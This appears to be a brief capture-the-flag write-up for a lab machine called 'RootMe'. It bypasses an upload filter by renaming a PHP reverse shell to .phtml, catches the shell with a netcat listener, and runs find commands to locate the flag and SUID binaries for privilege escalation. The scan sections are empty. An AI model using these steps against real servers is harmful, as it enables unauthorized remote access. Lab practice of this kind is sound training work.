# RootMe

IP - 10.10.88.7

## Scanning and Enumeration
nmap scan:
```

```
dirsearch:
```

```

## Exploit
- http://10.10.88.7/panel is vulnerable to file upload.
- http://10.10.88.7/uploads allows you to see the uploaded files.
- Website allows .txt to be uploaded but .php gets denied.


## Reverse Shell
- In terminal navigate to ``` /usr/share/webshells/php/php-reverse-shell.php ```
- ``` cp php-reverse-shell.php ~/Documents/php_reverse_shell.phtml ``` (copy executable file to "Docuemnts" directory and change the file name to .phtml file).


*The reason behind changing the file name to .phtml it's because we need to use a different php extension in order to execute the php reverse shell.
- Upload the executable file in the website and then go to http://10.10.88.7/uploads.
- In the terminal start netcat listener - ``` nc -nlvp 4444 ``` > go back to the website and open the executable file > acheived reverese shell.

## Post-Exploit
- To find user.txt - ``` find / -name “user.txt” 2>/dev/null ```

# Priviledge Escalation
Finding user with different priviledges -``` find / -user root -perm -4000 2>/dev/null ```
